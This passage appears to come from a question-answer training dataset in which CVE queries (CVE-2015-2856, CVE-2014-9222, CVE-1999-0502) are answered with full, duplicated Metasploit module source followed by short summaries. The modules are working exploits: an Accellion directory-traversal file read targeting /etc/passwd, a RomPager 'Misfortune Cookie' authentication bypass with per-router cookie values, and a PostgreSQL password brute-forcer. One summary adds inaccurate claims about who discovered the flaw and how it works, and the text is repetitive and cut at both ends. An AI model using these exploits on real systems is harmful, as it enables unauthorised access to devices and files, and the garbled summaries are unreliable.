Opt::RPORT(443),        OptBool.new('SSL', [true, 'Use SSL', true]),        OptString.new('TARGETURI', [true, 'The URI to request that triggers a call to template()', '/courier/intermediate_login.html']),        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),      ])  end  def run_host(ip)    res = send_request_cgi({      'method' => 'GET',      'uri'    => datastore['TARGETURI'],      'cookie' => 'statecode=../../../../..' + datastore['FILEPATH'] + '%00',    })    return if not res    if res.code != 200      vprint_status(\"#{peer} Unexpected response code: #{res.code} #{res.message}\")      return    end    contents = res.body.to_s    # Check for patched versions of the FTA    if contents =~ / Missing session ID.*Accellion, Inc/m      print_error(\"#{peer} Appears to be a patched Accellion FTA\")      return    end    fname = ::File.basename(datastore['FILEPATH'])    expected_server  = \"Apache\"    expected_expires = 'Mon, 26 Jul 1997 05:00:00 GMT'    # Use hints from the server headers to indicate whether we think this was a valid response    if res.headers['Server'].to_s == expected_server && res.headers['Expires'].to_s == expected_expires      path = store_loot(        'accellion.fta.file',        'application/octet-stream',        rhost,        res.body,        fname      )      print_good(\"#{peer} Sucessfully downloaded #{datastore['FILEPATH']} as #{path}\")    else      vprint_status(        \"#{peer} Unexpected response headers: (Server=#{res.headers['Server'].inspect} Expected=#{expected_server.inspect}) \" +        \"(Expires=#{res.headers['Expires'].inspect} Expected=#{expected_expires.inspect})\"      )    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(update_info(info,      'Name'           => \"Accellion FTA 'statecode' Cookie Arbitrary File Read\",      'Description'    => %q{          This module exploits a file disclosure vulnerability in the Accellion        File Transfer appliance. This vulnerability is triggered when a user-provided        'statecode' cookie parameter is appended to a file path that is processed as        a HTML template. By prepending this cookie with directory traversal sequence        and appending a NULL byte, any file readable by the web user can be exposed.        The web user has read access to a number of sensitive files, including the        system configuration and files uploaded to the appliance by users.        This issue was confirmed on version FTA_9_11_200, but may apply to previous        versions as well. This issue was fixed in software update FTA_9_11_210.      },      'Author'         => [ 'hdm' ],      'License'        => MSF_LICENSE,      'References'     =>        [          ['URL', 'https://www.rapid7.com/blog/post/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857/'],          ['CVE', '2015-2856']        ],      'DisclosureDate' => '2015-07-10'    ))    register_options(      [        Opt::RPORT(443),        OptBool.new('SSL', [true, 'Use SSL', true]),        OptString.new('TARGETURI', [true, 'The URI to request that triggers a call to template()', '/courier/intermediate_login.html']),        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),      ])  end  def run_host(ip)    res = send_request_cgi({      'method' => 'GET',      'uri'    => datastore['TARGETURI'],      'cookie' => 'statecode=../../../../..' + datastore['FILEPATH'] + '%00',    })    return if not res    if res.code != 200      vprint_status(\"#{peer} Unexpected response code: #{res.code} #{res.message}\")      return    end    contents = res.body.to_s    # Check for patched versions of the FTA    if contents =~ / Missing session ID.*Accellion, Inc/m      print_error(\"#{peer} Appears to be a patched Accellion FTA\")      return    end    fname = ::File.basename(datastore['FILEPATH'])    expected_server  = \"Apache\"    expected_expires = 'Mon, 26 Jul 1997 05:00:00 GMT'    # Use hints from the server headers to indicate whether we think this was a valid response    if res.headers['Server'].to_s == expected_server && res.headers['Expires'].to_s == expected_expires      path = store_loot(        'accellion.fta.file',        'application/octet-stream',        rhost,        res.body,        fname      )      print_good(\"#{peer} Sucessfully downloaded #{datastore['FILEPATH']} as #{path}\")    else      vprint_status(        \"#{peer} Unexpected response headers: (Server=#{res.headers['Server'].inspect} Expected=#{expected_server.inspect}) \" +        \"(Expires=#{res.headers['Expires'].inspect} Expected=#{expected_expires.inspect})\"      )    end  endend       Question: CVE-2015-2856[/INST] CVE-2015-2856 is a file disclosure vulnerability affecting the Accellion File Transfer Appliance. This vulnerability allows an attacker to expose any file readable by the web user by manipulating the 'statecode' cookie parameter in a HTTP request. The affected application processes the cookie value as part of a HTML template, allowing for directory traversal attacks and potential exposure of sensitive files. The vulnerability was confirmed on version FTA_9_11_200 and was fixed in software update FTA_9_11_210."}
{"query": "CVE-2014-9222", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  def initialize(info = {})    super(update_info(      info,      'Name' => \"Allegro Software RomPager 'Misfortune Cookie' (CVE-2014-9222) Scanner\",      'Description' => %q(        This module scans for HTTP servers that appear to be vulnerable to the        'Misfortune Cookie' vulnerability which affects Allegro Software        Rompager versions before 4.34 and can allow attackers to authenticate        to the HTTP service as an administrator without providing valid        credentials.      ),      'Author' => [        'Jon Hart <jon_hart[at]rapid7.com>', # metasploit module        'Lior Oppenheim' # CVE-2014-9222      ],      'References' => [        ['CVE', '2014-9222'],        ['URL', 'http://mis.fortunecook.ie'],        ['URL', 'http://mis.fortunecook.ie/misfortune-cookie-suspected-vulnerable.pdf'], # list of likely vulnerable devices        ['URL', 'http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf'] # 31C3 presentation with POC      ],      'DisclosureDate' => '2014-12-17',      'License' => MSF_LICENSE    ))    register_options(      [        OptString.new('TARGETURI', [true, 'URI to test', '/'])      ], Exploit::Remote::HttpClient    )    register_advanced_options(      [        OptString.new('CANARY_URI', [false, 'Try overwriting the requested URI with this canary value (empty for random)']),        OptString.new('STATUS_CODES_REGEX', [true, 'Ensure that canary pages and probe responses have status codes that match this regex', '^40[134]$'])      ], self.class    )  end  def check_host(_ip)    begin      test_misfortune    ensure      disconnect    end  end  def run_host(ip)    status = check_host(ip)    case status    when Exploit::CheckCode::Appears    when Exploit::CheckCode::Detected    when Exploit::CheckCode::Vulnerable      print_good(\"#{peer} #{status.last}\")    else      vprint_status(\"#{peer} #{status.last}\")    end  end  def setup    @status_codes_regex = Regexp.new(datastore['STATUS_CODES_REGEX'])  end  # Fingerprints the provided HTTP response and returns  # Exploit::CheckCode::Appears if it is a vulnerable version of RomPager,  # otherwise returns the provided fall-back status.  def check_response_fingerprint(res, fallback_status)    fp = http_fingerprint(response: res)    if /RomPager\\/(?<version>[\\d\\.]+)/ =~ fp      vprint_status(\"#{peer} is RomPager #{version}\")      if Rex::Version.new(version) < Rex::Version.new('4.34')        return Exploit::CheckCode::Appears      end    end    fallback_status  end  def find_canary    vprint_status(\"#{peer} locating suitable canary URI\")    canaries = []    if datastore['CANARY_URI']      canaries << datastore['CANARY_URI']    else      # several random URIs in the hopes that one, generally the first, will be usable      0.upto(4) { canaries << '/' + Rex::Text.rand_text_alpha(16) }    end    canaries.each do |canary|      res = send_request_raw(        'uri' => normalize_uri(canary),        'method' => 'GET',        'headers' => headers      )      # in most cases, the canary URI will not exist and will return a 404, but      # if everything under TARGETURI is protected by auth, a 401 may be OK too.      # but, regardless, respect the configuration set for this module      return [canary, res.code] if res && res.code.to_s =~ @status_codes_regex    end    nil  end  def headers    {      'Referer' => full_uri    }  end  # To test for this vulnerability, we must first find a URI known to return  # a 404 (not found) which we will use as a canary.  This URI (for example,  # /foo) is then taken and used as the value for a carefully crafted cookie  # when making a request to the configured host+port+uri.  If the response  # is a 404 and the body includes the canary, it is likely that the cookie  # overwrote RomPager's concept of the requested URI, indicating that it is  # vulnerable.  def test_misfortune    # find a usable canary URI (one that returns an acceptable status code already)    if canary = find_canary      canary_value, canary_code = canary      vprint_status(\"#{peer} found canary URI #{canary_value} with code #{canary_code}\")    else      vprint_error(\"#{peer} Unable to find a suitable canary URI\")      return Exploit::CheckCode::Unknown    end    canary_cookie_name = 'C107373883'    canary_cookie = canary_cookie_name + \"=#{canary_value};\"    # Make a request containing a specific canary cookie name with the value set    # from the suitable canary value found above.    res = send_request_raw(      'uri' => normalize_uri(target_uri.path.to_s),      'method' => 'GET',      'headers' => headers.merge('Cookie' => canary_cookie)    )    unless res      vprint_error(\"#{full_uri} no response\")      return Exploit::CheckCode::Unknown    end    unless res.code.to_s =~ @status_codes_regex      vprint_status(\"#{full_uri} unexpected HTTP code #{res.code} response\")      return check_response_fingerprint(res, Exploit::CheckCode::Detected)    end    unless res.body      vprint_status(\"#{full_uri} HTTP code #{res.code} had no body\")      return check_response_fingerprint(res, Exploit::CheckCode::Detected)    end    # If that canary *value* shows up in the *body*, then there are two possibilities:    #    # 1) If the canary cookie *name* is also in the *body*, it is likely that    # the endpoint is puppeting back our request to some extent and therefore    # it is expected that the canary cookie *value* would also be there.    # return Exploit::CheckCode::Detected    #    # 2) If the canary cookie *name* is *not* in the *body*, return    # Exploit::CheckCode::Vulnerable    if res.body.include?(canary_value)      if res.body.include?(canary_cookie_name)        vprint_status(\"#{full_uri} HTTP code #{res.code} response contained canary cookie name #{canary_cookie_name}\")        return check_response_fingerprint(res, Exploit::CheckCode::Detected)      else        vprint_good(\"#{full_uri} HTTP code #{res.code} response contained canary cookie value #{canary_value} as URI\")        report_vuln(          host: rhost,          port: rport,          name: name,          refs: references        )        return Exploit::CheckCode::Vulnerable      end    end    vprint_status(\"#{full_uri} HTTP code #{res.code} response did not contain canary cookie value #{canary_value} as URI\")    check_response_fingerprint(res, Exploit::CheckCode::Safe)  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  def initialize(info = {})    super(update_info(      info,      'Name' => \"Allegro Software RomPager 'Misfortune Cookie' (CVE-2014-9222) Scanner\",      'Description' => %q(        This module scans for HTTP servers that appear to be vulnerable to the        'Misfortune Cookie' vulnerability which affects Allegro Software        Rompager versions before 4.34 and can allow attackers to authenticate        to the HTTP service as an administrator without providing valid        credentials.      ),      'Author' => [        'Jon Hart <jon_hart[at]rapid7.com>', # metasploit module        'Lior Oppenheim' # CVE-2014-9222      ],      'References' => [        ['CVE', '2014-9222'],        ['URL', 'http://mis.fortunecook.ie'],        ['URL', 'http://mis.fortunecook.ie/misfortune-cookie-suspected-vulnerable.pdf'], # list of likely vulnerable devices        ['URL', 'http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf'] # 31C3 presentation with POC      ],      'DisclosureDate' => '2014-12-17',      'License' => MSF_LICENSE    ))    register_options(      [        OptString.new('TARGETURI', [true, 'URI to test', '/'])      ], Exploit::Remote::HttpClient    )    register_advanced_options(      [        OptString.new('CANARY_URI', [false, 'Try overwriting the requested URI with this canary value (empty for random)']),        OptString.new('STATUS_CODES_REGEX', [true, 'Ensure that canary pages and probe responses have status codes that match this regex', '^40[134]$'])      ], self.class    )  end  def check_host(_ip)    begin      test_misfortune    ensure      disconnect    end  end  def run_host(ip)    status = check_host(ip)    case status    when Exploit::CheckCode::Appears    when Exploit::CheckCode::Detected    when Exploit::CheckCode::Vulnerable      print_good(\"#{peer} #{status.last}\")    else      vprint_status(\"#{peer} #{status.last}\")    end  end  def setup    @status_codes_regex = Regexp.new(datastore['STATUS_CODES_REGEX'])  end  # Fingerprints the provided HTTP response and returns  # Exploit::CheckCode::Appears if it is a vulnerable version of RomPager,  # otherwise returns the provided fall-back status.  def check_response_fingerprint(res, fallback_status)    fp = http_fingerprint(response: res)    if /RomPager\\/(?<version>[\\d\\.]+)/ =~ fp      vprint_status(\"#{peer} is RomPager #{version}\")      if Rex::Version.new(version) < Rex::Version.new('4.34')        return Exploit::CheckCode::Appears      end    end    fallback_status  end  def find_canary    vprint_status(\"#{peer} locating suitable canary URI\")    canaries = []    if datastore['CANARY_URI']      canaries << datastore['CANARY_URI']    else      # several random URIs in the hopes that one, generally the first, will be usable      0.upto(4) { canaries << '/' + Rex::Text.rand_text_alpha(16) }    end    canaries.each do |canary|      res = send_request_raw(        'uri' => normalize_uri(canary),        'method' => 'GET',        'headers' => headers      )      # in most cases, the canary URI will not exist and will return a 404, but      # if everything under TARGETURI is protected by auth, a 401 may be OK too.      # but, regardless, respect the configuration set for this module      return [canary, res.code] if res && res.code.to_s =~ @status_codes_regex    end    nil  end  def headers    {      'Referer' => full_uri    }  end  # To test for this vulnerability, we must first find a URI known to return  # a 404 (not found) which we will use as a canary.  This URI (for example,  # /foo) is then taken and used as the value for a carefully crafted cookie  # when making a request to the configured host+port+uri.  If the response  # is a 404 and the body includes the canary, it is likely that the cookie  # overwrote RomPager's concept of the requested URI, indicating that it is  # vulnerable.  def test_misfortune    # find a usable canary URI (one that returns an acceptable status code already)    if canary = find_canary      canary_value, canary_code = canary      vprint_status(\"#{peer} found canary URI #{canary_value} with code #{canary_code}\")    else      vprint_error(\"#{peer} Unable to find a suitable canary URI\")      return Exploit::CheckCode::Unknown    end    canary_cookie_name = 'C107373883'    canary_cookie = canary_cookie_name + \"=#{canary_value};\"    # Make a request containing a specific canary cookie name with the value set    # from the suitable canary value found above.    res = send_request_raw(      'uri' => normalize_uri(target_uri.path.to_s),      'method' => 'GET',      'headers' => headers.merge('Cookie' => canary_cookie)    )    unless res      vprint_error(\"#{full_uri} no response\")      return Exploit::CheckCode::Unknown    end    unless res.code.to_s =~ @status_codes_regex      vprint_status(\"#{full_uri} unexpected HTTP code #{res.code} response\")      return check_response_fingerprint(res, Exploit::CheckCode::Detected)    end    unless res.body      vprint_status(\"#{full_uri} HTTP code #{res.code} had no body\")      return check_response_fingerprint(res, Exploit::CheckCode::Detected)    end    # If that canary *value* shows up in the *body*, then there are two possibilities:    #    # 1) If the canary cookie *name* is also in the *body*, it is likely that    # the endpoint is puppeting back our request to some extent and therefore    # it is expected that the canary cookie *value* would also be there.    # return Exploit::CheckCode::Detected    #    # 2) If the canary cookie *name* is *not* in the *body*, return    # Exploit::CheckCode::Vulnerable    if res.body.include?(canary_value)      if res.body.include?(canary_cookie_name)        vprint_status(\"#{full_uri} HTTP code #{res.code} response contained canary cookie name #{canary_cookie_name}\")        return check_response_fingerprint(res, Exploit::CheckCode::Detected)      else        vprint_good(\"#{full_uri} HTTP code #{res.code} response contained canary cookie value #{canary_value} as URI\")        report_vuln(          host: rhost,          port: rport,          name: name,          refs: references        )        return Exploit::CheckCode::Vulnerable      end    end    vprint_status(\"#{full_uri} HTTP code #{res.code} response did not contain canary cookie value #{canary_value} as URI\")    check_response_fingerprint(res, Exploit::CheckCode::Safe)  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  def initialize(info = {})    super(      update_info(        info,        'Name' => \"Allegro Software RomPager 'Misfortune Cookie' (CVE-2014-9222) Authentication Bypass\",        'Description' => %q{          This module exploits HTTP servers that appear to be vulnerable to the          'Misfortune Cookie' vulnerability which affects Allegro Software          Rompager versions before 4.34 and can allow attackers to authenticate          to the HTTP service as an administrator without providing valid          credentials.        },        'Author' => [          'Jon Hart <jon_hart[at]rapid7.com>', # metasploit scanner module          'Jan Trencansky <jan.trencansky[at]gmail.com>', # metasploit auxiliary admin module          'Lior Oppenheim' # CVE-2014-9222        ],        'References' => [          ['CVE', '2014-9222'],          ['URL', 'https://web.archive.org/web/20191006135858/http://mis.fortunecook.ie/'],          ['URL', 'https://web.archive.org/web/20190207102911/http://mis.fortunecook.ie/misfortune-cookie-suspected-vulnerable.pdf'], # list of likely vulnerable devices          ['URL', 'https://web.archive.org/web/20190623150837/http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf'] # 31C3 presentation with POC        ],        'DisclosureDate' => '2014-12-17',        'License' => MSF_LICENSE      )    )    register_options(      [        OptString.new('TARGETURI', [true, 'URI to test', '/']),      ], Exploit::Remote::HttpClient    )    register_advanced_options(      [        Msf::OptBool.new('ForceAttempt', [ false, 'Force exploit attempt for all known cookies', false ]),      ], Exploit::Remote::HttpClient    )  end  def headers    {      'Referer' => full_uri    }  end  # List of known values and models  def devices_list    known_devices = {      :'AZ-D140W' =>          {            name: 'Azmoon', model: 'AZ-D140W', values: [              [107367693, 13]            ]          },      :'BiPAC 5102S' =>            {              name: 'Billion', model: 'BiPAC 5102S', values: [ [107369694, 13]              ]            },      :'BiPAC 5200' =>            {              name: 'Billion', model: 'BiPAC 5200', values: [ [107369545, 9], [107371218, 21]              ]            },      :'BiPAC 5200A' =>            {              name: 'Billion', model: 'BiPAC 5200A', values: [ [107366366, 25], [107371453, 9]              ]            },      :'BiPAC 5200GR4' =>            {              name: 'Billion', model: 'BiPAC 5200GR4', values: [ [107367690, 21]              ]            },      :'BiPAC 5200SRD' =>            {              name: 'Billion', model: 'BiPAC 5200SRD', values: [ [107368270, 1], [107371378, 3], [107371218, 13]              ]            },      :'DSL-2520U' =>            {              name: 'D-Link', model: 'DSL-2520U', values: [ [107368902, 25]              ]            },      :'DSL-2600U' =>            {              name: 'D-Link', model: 'DSL-2600U', values: [ [107366496, 13], [107360133, 20]              ]            },      :'TD-8616' =>            {              name: 'TP-Link', model: 'TD-8616', values: [ [107371483, 21], [107369790, 17], [107371161, 1], [107371426, 17], [107370211, 5],              ]            },      :'TD-8817' =>            {              name: 'TP-Link', model: 'TD-8817', values: [ [107369790, 17], [107369788, 1], [107369522, 25], [107369316, 21], [107369321, 9], [107351277, 20]              ]            },      :'TD-8820' =>            {              name: 'TP-Link', model: 'TD-8820', values: [ [107369768, 17]              ]            },      :'TD-8840T' =>            {              name: 'TP-Link', model: 'TD-8840T', values: [ [107369845, 5], [107369790, 17], [107369570, 1], [107369766, 1], [107369764, 5], [107369688, 17]              ]            },      :'TD-W8101G' =>            {              name: 'TP-Link', model: 'TD-W8101G', values: [ [107367772, 37], [107367808, 21], [107367751, 21], [107367749, 13], [107367765, 25], [107367052, 25], [107365835, 1]              ]            },      :'TD-W8151N' =>            {              name: 'TP-Link', model: 'TD-W8151N', values: [ [107353867, 24]              ]            },      :'TD-W8901G' =>            {              name: 'TP-Link', model: 'TD-W8901G', values: [ [107367787, 21], [107368013, 5], [107367854, 9], [107367751, 21], [107367749, 13], [107367765, 25], [107367682, 21], [107365835, 1], [107367052, 25]              ]            },      :'TD-W8901GB' =>            {              name: 'TP-Link', model: 'TD-W8901GB', values: [ [107367756, 13], [107369393, 21]              ]            },      :'TD-W8901N' =>            {              name: 'TP-Link', model: 'TD-W8901N', values: [ [107353880, 0]              ]            },      :'TD-W8951ND' =>            {              name: 'TP-Link', model: 'TD-W8951ND', values: [ [107369839, 25], [107369876, 13], [107366743, 21], [107364759, 25], [107364759, 13], [107364760, 21]              ]            },      :'TD-W8961NB' =>            {              name: 'TP-Link', model: 'TD-W8961NB', values: [ [107369844, 17], [107367629, 21], [107366421, 13]              ]            },      :'TD-W8961ND' =>            {              name: 'TP-Link', model: 'TD-W8961ND', values: [ [107369839, 25], [107369876, 13], [107364732, 25], [107364771, 37], [107364762, 29], [107353880, 0], [107353414, 36]              ]            },      :'P-660R-T3 v3' => # This value works on devices with model P-660R-T3 v3 not P-660R-T3 v3s            {              name: 'ZyXEL', model: 'P-660R-T3', values: [ [107369567, 21]              ]            },      :'P-660RU-T3 v2' => # Couldn't verify this            {              name: 'ZyXEL', model: 'P-660R-T3', values: [ [107369567, 21]              ]            },      ALL => # Used when `ForceAttempt` === true            { name: 'Unknown', model: 'Forced', values: [] }    }    # collect all known cookies for a brute force option    all_cookies = []    known_devices.collect { |_, v| v[:values] }.each do |list|      all_cookies += list    end    known_devices[:ALL][:values] = all_cookies.uniq    known_devices  end  def check_response_fingerprint(res, fallback_status)    fp = http_fingerprint(response: res)    vprint_status(\"Fingerprint: #{fp}\")    # ensure the fingerprint at least appears vulnerable    if %r{RomPager/(?<version>[\\d.]+)} =~ fp      vprint_status(\"#{peer} is RomPager #{version}\")      if Rex::Version.new(version) < Rex::Version.new('4.34') && /realm=\"(?<model>.+)\"/ =~ fp        return model      end    end    fallback_status  end  def run    res = send_request_raw(      'uri' => normalize_uri(target_uri.path.to_s),      'method' => 'GET'    )    model = check_response_fingerprint(res, Exploit::CheckCode::Detected)    if model != Exploit::CheckCode::Detected      devices = devices_list[model.to_sym]      devices = devices_list[:ALL] if devices.nil? && datastore['ForceAttempt']      if !devices.nil?        print_good(\"Detected device:#{devices[:name]} #{devices[:model]}\")        devices[:values].each do |value|          cookie = \"C#{value[0]}=#{'B' * value[1]}\\x00\"          res = send_request_raw(            'uri' => normalize_uri(target_uri.path.to_s),            'method' => 'GET',            'headers' => headers.merge('Cookie' => cookie)          )          if !res.nil? && (res.code <= 302)            print_good('Good response, please check host, authentication should be disabled')            break          else            print_error('Bad response')          end        end      else        print_error(\"No matching values for fingerprint #{model}\")      end    else      print_error('Unknown device')    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  def initialize(info = {})    super(      update_info(        info,        'Name' => \"Allegro Software RomPager 'Misfortune Cookie' (CVE-2014-9222) Authentication Bypass\",        'Description' => %q{          This module exploits HTTP servers that appear to be vulnerable to the          'Misfortune Cookie' vulnerability which affects Allegro Software          Rompager versions before 4.34 and can allow attackers to authenticate          to the HTTP service as an administrator without providing valid          credentials.        },        'Author' => [          'Jon Hart <jon_hart[at]rapid7.com>', # metasploit scanner module          'Jan Trencansky <jan.trencansky[at]gmail.com>', # metasploit auxiliary admin module          'Lior Oppenheim' # CVE-2014-9222        ],        'References' => [          ['CVE', '2014-9222'],          ['URL', 'https://web.archive.org/web/20191006135858/http://mis.fortunecook.ie/'],          ['URL', 'https://web.archive.org/web/20190207102911/http://mis.fortunecook.ie/misfortune-cookie-suspected-vulnerable.pdf'], # list of likely vulnerable devices          ['URL', 'https://web.archive.org/web/20190623150837/http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf'] # 31C3 presentation with POC        ],        'DisclosureDate' => '2014-12-17',        'License' => MSF_LICENSE      )    )    register_options(      [        OptString.new('TARGETURI', [true, 'URI to test', '/']),      ], Exploit::Remote::HttpClient    )    register_advanced_options(      [        Msf::OptBool.new('ForceAttempt', [ false, 'Force exploit attempt for all known cookies', false ]),      ], Exploit::Remote::HttpClient    )  end  def headers    {      'Referer' => full_uri    }  end  # List of known values and models  def devices_list    known_devices = {      :'AZ-D140W' =>          {            name: 'Azmoon', model: 'AZ-D140W', values: [              [107367693, 13]            ]          },      :'BiPAC 5102S' =>            {              name: 'Billion', model: 'BiPAC 5102S', values: [ [107369694, 13]              ]            },      :'BiPAC 5200' =>            {              name: 'Billion', model: 'BiPAC 5200', values: [ [107369545, 9], [107371218, 21]              ]            },      :'BiPAC 5200A' =>            {              name: 'Billion', model: 'BiPAC 5200A', values: [ [107366366, 25], [107371453, 9]              ]            },      :'BiPAC 5200GR4' =>            {              name: 'Billion', model: 'BiPAC 5200GR4', values: [ [107367690, 21]              ]            },      :'BiPAC 5200SRD' =>            {              name: 'Billion', model: 'BiPAC 5200SRD', values: [ [107368270, 1], [107371378, 3], [107371218, 13]              ]            },      :'DSL-2520U' =>            {              name: 'D-Link', model: 'DSL-2520U', values: [ [107368902, 25]              ]            },      :'DSL-2600U' =>            {              name: 'D-Link', model: 'DSL-2600U', values: [ [107366496, 13], [107360133, 20]              ]            },      :'TD-8616' =>            {              name: 'TP-Link', model: 'TD-8616', values: [ [107371483, 21], [107369790, 17], [107371161, 1], [107371426, 17], [107370211, 5],              ]            },      :'TD-8817' =>            {              name: 'TP-Link', model: 'TD-8817', values: [ [107369790, 17], [107369788, 1], [107369522, 25], [107369316, 21], [107369321, 9], [107351277, 20]              ]            },      :'TD-8820' =>            {              name: 'TP-Link', model: 'TD-8820', values: [ [107369768, 17]              ]            },      :'TD-8840T' =>            {              name: 'TP-Link', model: 'TD-8840T', values: [ [107369845, 5], [107369790, 17], [107369570, 1], [107369766, 1], [107369764, 5], [107369688, 17]              ]            },      :'TD-W8101G' =>            {              name: 'TP-Link', model: 'TD-W8101G', values: [ [107367772, 37], [107367808, 21], [107367751, 21], [107367749, 13], [107367765, 25], [107367052, 25], [107365835, 1]              ]            },      :'TD-W8151N' =>            {              name: 'TP-Link', model: 'TD-W8151N', values: [ [107353867, 24]              ]            },      :'TD-W8901G' =>            {              name: 'TP-Link', model: 'TD-W8901G', values: [ [107367787, 21], [107368013, 5], [107367854, 9], [107367751, 21], [107367749, 13], [107367765, 25], [107367682, 21], [107365835, 1], [107367052, 25]              ]            },      :'TD-W8901GB' =>            {              name: 'TP-Link', model: 'TD-W8901GB', values: [ [107367756, 13], [107369393, 21]              ]            },      :'TD-W8901N' =>            {              name: 'TP-Link', model: 'TD-W8901N', values: [ [107353880, 0]              ]            },      :'TD-W8951ND' =>            {              name: 'TP-Link', model: 'TD-W8951ND', values: [ [107369839, 25], [107369876, 13], [107366743, 21], [107364759, 25], [107364759, 13], [107364760, 21]              ]            },      :'TD-W8961NB' =>            {              name: 'TP-Link', model: 'TD-W8961NB', values: [ [107369844, 17], [107367629, 21], [107366421, 13]              ]            },      :'TD-W8961ND' =>            {              name: 'TP-Link', model: 'TD-W8961ND', values: [ [107369839, 25], [107369876, 13], [107364732, 25], [107364771, 37], [107364762, 29], [107353880, 0], [107353414, 36]              ]            },      :'P-660R-T3 v3' => # This value works on devices with model P-660R-T3 v3 not P-660R-T3 v3s            {              name: 'ZyXEL', model: 'P-660R-T3', values: [ [107369567, 21]              ]            },      :'P-660RU-T3 v2' => # Couldn't verify this            {              name: 'ZyXEL', model: 'P-660R-T3', values: [ [107369567, 21]              ]            },      ALL => # Used when `ForceAttempt` === true            { name: 'Unknown', model: 'Forced', values: [] }    }    # collect all known cookies for a brute force option    all_cookies = []    known_devices.collect { |_, v| v[:values] }.each do |list|      all_cookies += list    end    known_devices[:ALL][:values] = all_cookies.uniq    known_devices  end  def check_response_fingerprint(res, fallback_status)    fp = http_fingerprint(response: res)    vprint_status(\"Fingerprint: #{fp}\")    # ensure the fingerprint at least appears vulnerable    if %r{RomPager/(?<version>[\\d.]+)} =~ fp      vprint_status(\"#{peer} is RomPager #{version}\")      if Rex::Version.new(version) < Rex::Version.new('4.34') && /realm=\"(?<model>.+)\"/ =~ fp        return model      end    end    fallback_status  end  def run    res = send_request_raw(      'uri' => normalize_uri(target_uri.path.to_s),      'method' => 'GET'    )    model = check_response_fingerprint(res, Exploit::CheckCode::Detected)    if model != Exploit::CheckCode::Detected      devices = devices_list[model.to_sym]      devices = devices_list[:ALL] if devices.nil? && datastore['ForceAttempt']      if !devices.nil?        print_good(\"Detected device:#{devices[:name]} #{devices[:model]}\")        devices[:values].each do |value|          cookie = \"C#{value[0]}=#{'B' * value[1]}\\x00\"          res = send_request_raw(            'uri' => normalize_uri(target_uri.path.to_s),            'method' => 'GET',            'headers' => headers.merge('Cookie' => cookie)          )          if !res.nil? && (res.code <= 302)            print_good('Good response, please check host, authentication should be disabled')            break          else            print_error('Bad response')          end        end      else        print_error(\"No matching values for fingerprint #{model}\")      end    else      print_error('Unknown device')    end  endend       Question: CVE-2014-9222[/INST] CVE-2014-9222 is a vulnerability affecting Allegro Software RomPager versions before 4.34. It allows attackers to authenticate to the HTTP service as an administrator without providing valid credentials. This vulnerability can be exploited through a specially crafted cookie.To understand this vulnerability better, let's examine its context. The affected software, RomPager, is a web interface used to manage network devices like routers and switches. When a client sends a request to the RomPager server, the server responds with a cookie containing a session ID. This cookie is sent back with each subsequent request, allowing the server to identify the client and maintain the state of the connection.However, in older versions of RomPager, the way the session ID is handled is vulnerable to manipulation. Specifically, an attacker can create a cookie with a malicious session ID and send it to the server. Since the server doesn't validate the authenticity of the cookie, it accepts the malicious one instead of the legitimate one. Once the attacker has a malicious session ID, they can perform administrative actions on the targeted device.This vulnerability was discovered and documented by researchers Jan Trencansky and Lior Oppenheim. They released a Metasploit module to help detect and exploit this vulnerability in affected systems.To mitigate this risk, organizations should update their RomPager instances to version 4.34 or newer, which addresses this vulnerability. Additionally, implementing proper cookie validation mechanisms can help protect against similar attacks in the future."}
{"query": "CVE-1999-0502", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require 'metasploit/framework/credential_collection'require 'metasploit/framework/login_scanner/postgres'class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::Postgres  include Msf::Auxiliary::AuthBrute  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  # Creates an instance of this module.  def initialize(info = {})    super(update_info(info,      'Name'           => 'PostgreSQL Login Utility',      'Description'    => %q{        This module attempts to authenticate against a PostgreSQL        instance using username and password combinations indicated        by the USER_FILE, PASS_FILE, and USERPASS_FILE options. Note that        passwords may be either plaintext or MD5 formatted hashes.      },      'Author'         => [ 'todb' ],      'License'        => MSF_LICENSE,      'References'     =>        [          [ 'URL', 'https://www.postgresql.org/' ],          [ 'CVE', '1999-0502'], # Weak password          [ 'URL', 'https://hashcat.net/forum/archive/index.php?thread-4148.html' ] # Pass the Hash        ]    ))    register_options(      [        Opt::Proxies,        OptPath.new('USERPASS_FILE',  [ false, \"File containing (space-separated) users and passwords, one pair per line\",          File.join(Msf::Config.data_directory, \"wordlists\", \"postgres_default_userpass.txt\") ]),        OptPath.new('USER_FILE',      [ false, \"File containing users, one per line\",          File.join(Msf::Config.data_directory, \"wordlists\", \"postgres_default_user.txt\") ]),        OptPath.new('PASS_FILE',      [ false, \"File containing passwords, one per line\",          File.join(Msf::Config.data_directory, \"wordlists\", \"postgres_default_pass.txt\") ]),      ])    deregister_options('SQL', 